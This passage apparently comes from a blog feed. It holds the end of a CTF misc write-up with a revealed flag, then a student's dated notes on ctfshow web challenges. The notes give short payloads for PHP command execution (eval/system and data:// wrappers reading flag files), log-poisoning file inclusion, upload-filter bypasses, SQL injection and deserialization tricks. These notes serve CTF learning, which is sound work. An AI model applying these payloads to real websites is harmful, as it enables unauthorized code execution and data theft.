src="/img/ISCC%E4%B8%80%E8%A1%803.png" alt="图片" title="找到flag.txt"><br>接下来在<a href="https://www.uutils.com/enc/hmac_sha.htm">加密解密网站</a>中一个一个的试带盐的加密，最终试到是HmacMD5加密算法<br>最终拿到flag:ISCC{86bd2a65ea0d68bf231dd5c0a9c5e8c1}<br><img src="/img/ISCC%E4%B8%80%E8%A1%804.png" alt="图片" title="成功获得该题flag"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>MISC方向的题目通常需要技术常识和工具使用外的<strong>一点灵性脑洞</strong>才能解出题目来。<br>成语学习这个题目也不例外。首先，需要会使用wireshark分析流量拿到密码，然后用命令查找到可能包含flag信息的文件，接着再利用密码基础联想到文本信息的隐藏意思想到其中可能会用到的算法。<br>这是我第一次拿一血，这种快乐是我之前从来没体会过的，有种世界上我最聪明的感觉。</p>]]></content>
    
    
    <categories>
      
      <category>竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web笔记</title>
    <link href="/2023/08/17/web%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/08/17/web%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我在打ctf的时候在<a href="https://ctf.show/challenges">ctfshow平台</a>学习web方向的记录，建议配合平台中的题目一起查看。<br>依据本人的学习经验web方向需要依靠大量的知识积累，类似于文科的背诵，再加上对新披露的漏洞的知晓，大部分比赛都是直接拿最新CVE来出题。</p><h2 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h2><p>直接查看网页源码，flag可能再被注释掉的内容里面没有显示出来（强制查看：通过在url头部添加 view-source:）web1 web2<br>通过burpsuite抓包 flag在返回的响应数据包里面 web3<br>&#x2F;robots.txt web4<br>phps作为备份文件，泄露了源码（index.phps）web5<br>www源码泄露 web6<br>url&#x2F;.git web7<br>url&#x2F;.svn web8<br>vim缓存泄露，在使用vim进行编辑时，会产生缓存文件，如果意外退出，缓存文件保留下来，这时可以通过缓存文件来得到原文件，以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo，第三次退出后文件名为.index.php.swn web9<br>cookie中也会隐藏数据 web10<br> nslookup -qt&#x3D;txt flag.ctfshow.com 其中有： 非权威应答: flag.ctfshow.com text &#x3D;<br>    “flag{just_seesee}” web11<br>有时候网站上的公开信息，就是管理员常用密码 web12<br>找网站的document，操作指南 web13<br>&#x2F;editor，暴露作者页面直接在url后面添加&#x2F;editor 然后查看flag路径并且访问 web14<br>邮箱会泄露信息 web15<br>php探针url&#x2F;tz.php web16<br>备份的sql文件会泄露敏感信息url&#x2F;backup.sql web17</p><p>—-2023.7.14.  22:25 l1nk</p><h2 id="2-爆破"><a href="#2-爆破" class="headerlink" title="2.爆破"></a>2.爆破</h2><p>爆破的时候，信息可能藏在Authorization中 web21<br>子域名爆破 web22<br>MD5加密 substr()、intval() web23<br>伪随机数 mt_srand()、mt_rand() web24</p><h2 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3.命令执行"></a>3.命令执行</h2><p>嵌套eval逃逸函数绕过过滤<br>url + ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘tac flag.php’);<br>php的filter伪协议，读取文件内容并输出<br>data伪协议，后面直接加执行的代码<br>套娃函数?c&#x3D;eval(array_pop(next(get_defined_vars())));</p><p>—-2023.7.16  1:25 l1nk</p><p>没有学习，打永劫去了</p><p>—-2023.7.17  0:02 l1nk</p><p>ls，cat是系统命令，需要包含在system（“”）中进行执行</p><p>data伪协议<br>payload：<br>url+?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("cat fla*.php");?><br>可简写为：url+?c&#x3D;data:,<?php system("cat fla*.php");?></p><p>filter伪协议</p><p>system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);写入黑洞文件中，利用 命令一；ls来执行命令一<br>当$(())没有参数时。默认为0，0的取反为-1 web57</p><p>—-2023.7.18  2:23 l1nk</p><p>c&#x3D;$a&#x3D;opendir(“.&#x2F;“); while (($file &#x3D; readdir($a)) !&#x3D;&#x3D; false){echo $file . “”; };查看当前目录是否有东西<br>$s &#x3D; ob_get_contents();<br>这一句的作用是定义了一个s变量并把ob_get_contents()返回的输出缓冲区的内容赋值给了s<br>ob_end_clean();<br>这个函数的作用是以字符串格式返回当前输出缓冲区并关闭输出缓冲<br>echo preg_replace(“&#x2F;[0-9]|[a-z]&#x2F;i”,”?”,$s);<br>这一句话是把变量s，即缓冲区内容的所有的数字和字母替换成了为?<br>缓冲区的题目需要在正确命令后面执行exit（）；及时退出才能成功执行<br>PDO连数据库</p><p>—-2023.7.18 16:34 l1nk</p><p>字符拼接，学不了一点，先不学（web118-124）</p><p>—-2023.7.19 17:34 l1nk</p><h2 id="4-文件包含"><a href="#4-文件包含" class="headerlink" title="4.文件包含"></a>4.文件包含</h2><p>nginx原理和日志文件包含，在User-Agent里面写php代码，中间件php-fpm会解析，实现恶意代码。<br>默认路径url?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>过滤掉了.的话要用session执行（web82-86）</p><h2 id="5-php"><a href="#5-php" class="headerlink" title="5.php"></a>5.php</h2><p>只检测数字的时候可以用数组绕过（web89）<br>m代表多行匹配（web91）<br>$num&#x3D;4476只匹配num是不是4476，可以用其他任何值绕过，包括4476的十六进制和八进制<br>intval（$num，0）&#x3D;4476表示匹配num的十进制值是否为4476</p><p>干到web100了呜呜呜0.55了，做完几个条件竞争就去睡觉</p><p>当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。<br>一般开发的web服务会使用多线程接收用户的请求，而线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，依靠临界区，session的临界区就是临时目录。<br>如果没有应用好同步技术则会产生“竞争条件”问题。意外生成攻击者想要生成的文件，这样攻击者可以在该文件还未被删除的时间段内进行非法操作。<br>PHP_SESSION_UPLOAD_PROGRESS用于设置&#x2F;tmp目录下生成的sess_PHPSESSID文件的内容<br>使用python脚本进行多线程请求，生成sess_PHPSESSID文件，实现rce<br>脚本链接：<a href="https://blog.csdn.net/weixin_46003360/article/details/119045296">https://blog.csdn.net/weixin_46003360/article/details/119045296</a>  （web82中）<br>—-2023.7.21 1:42 l1nk</p><p>临时文件目录：&#x2F;tmp&#x2F;php??????</p><h2 id="6-文件上传绕过"><a href="#6-文件上传绕过" class="headerlink" title="6.文件上传绕过"></a>6.文件上传绕过</h2><p>php替换为空，可以1.phphpp双写绕过得到1.php写入木马<br>00字符截断：123.php%00.jpg，后台以为是.jpg，文件上传的时候遇到%00就舍弃掉了后面的，以为是.php<br>iconv字符截断：utf-8字符集默认范围在0x00-0x7f，不在这个范围会报异常，后续字符不处理<br>123.php%df.jpg -&gt; 123.php<br>asp解析<br>基于nginx和php-fpm的错误配置：1.txt&#x2F;1.php如果1.php不存在会找前面的1.txt文件进行php解析（私教课43）<br>天呐我的脚本一直被删除（把系统的安全中心关了，安全软件全卸载了就行）<br>—-2023.7.21 21:44 l1nk</p><p>apache多后缀解析漏洞：123.txt.ctf ctf后缀不认识，往前找到txt作为后缀，处理为123.txt<br>伪协议绕过：auto_append_file&#x3D;php:&#x2F;&#x2F;input<br>日志文件绕过：auto_append_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>—-2023.7.22 22:51 l1nk</p><h2 id="7-sql注入"><a href="#7-sql注入" class="headerlink" title="7.sql注入"></a>7.sql注入</h2><p>sql注入，#和– （有个空格）为注释</p><p>—-2023.7.24 21:51 l1nk</p><p>盲注（工作量大）<br>报错注入，用updatexml；<br>见笔记（sql注入笔记day7）<br>—-2023.7.25 21:41 l1nk</p><p>&#x2F;&#x2F;filesystemiterator遍历文件类<br>&#x2F;&#x2F;directoryItrerator遍历目录类<br>—-2023.7.28 14:23 l1nk</p><p>is_file函数可以使用包装器伪协议来绕过，不影响file_get_contents highlight_file<br>is_file认为伪协议不是文件，highlight_file认为伪协议是文件<br>目录溢出会使is_file判断其不是文件，而highlight_file会正常识别<br>—-2023.7.31 22:00 l1nk</p><p>sql注入完了，开始php反序列化<br>—-2023.8.2  13:02 l1nk</p><h2 id="8-反序列化"><a href="#8-反序列化" class="headerlink" title="8.反序列化"></a>8.反序列化</h2><p>当用 &#x3D;&#x3D;&#x3D; 或 !&#x3D;&#x3D; 进行比较时则不进行类型转换，因为此时类型和数值都要比对。<br>$a &#x3D;&#x3D; $b 等于 TRUE，如果类型转换后 $a 等于 $b。<br>$a &#x3D;&#x3D;&#x3D; $b 全等 TRUE，如果 $a 等于 $b，并且它们的类型也相同。<br>$a !&#x3D; $b 不等 TRUE，如果类型转换后 $a 不等于 $b。 </p><p>_()是一个函数<br>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll<br>dnslog怎么又没用，无语了<br>—-2023.8.2  17:58 l1nk</p><p>反序列化，反不了一点<br>—-2023.8.9 20:41 l1nk</p><p>__wakeup() &#x2F;&#x2F;执行unserialize()时，先会调用这个函数<br>__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数<br>__destruct() &#x2F;&#x2F;对象被销毁时触发，当一个对象不再被引用时,PHP会自动销毁该对象,并在销毁之前调用__destruct方法。<br>__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get() &#x2F;&#x2F;用于从不可访问的属性读取数据或者不存在这个键都会调用此方法<br>__set() &#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发<br>__unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发<br>__toString() &#x2F;&#x2F;把类当作字符串使用时触发<br>__invoke() &#x2F;&#x2F;当尝试将对象调用为函数时触发</p><p>php版本：</p><p>​ PHP5 &lt; 5.6.25</p><p>​ PHP7 &lt; 7.0.10<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;666&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果执行unserialize(‘O:4:”test”:1:{s:1:”a”;s:3:”abc”;}’);输出结果为666</p><p>而把对象属性个数的值增大，1-&gt;2执行unserialize(‘O:4:”test”:2:{s:1:”a”;s:3:”abc”;}’);输出结果为abc</p><p>preg_match(‘&#x2F;^O:\d+&#x2F;‘)匹配序列化字符串是否是对象字符串开头<br>利用加号绕过（注意在url里传参时+要编码为%2B）</p><p>利用引用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;abc&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b= &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());<br></code></pre></td></tr></table></figure><p>上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等</p><p>16进制绕过字符的过滤<br>O:4:”test”:2:{s:4:”%00*%00a”;s:3:”abc”;s:7:”%00test%00b”;s:3:”def”;}<br>可以写成<br>O:4:”test”:2:{S:4:”\00*\00\61”;s:3:”abc”;s:7:”%00test%00b”;s:3:”def”;}<br>表示字符类型的s大写时，会被当成16进制解析。</p><p>反序列化的字符逃逸<br>过滤后字符变多：利用引号闭合和大括号闭合，舍弃掉原有的部分序列化后的结果<br>过滤后字符变少：前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码<br>—-2023.8.11 20:19 l1nk</p><p>pop链没看懂，和之前的字符拼接之后一起学。<br>—-2023.8.17 13:59 l1nk</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
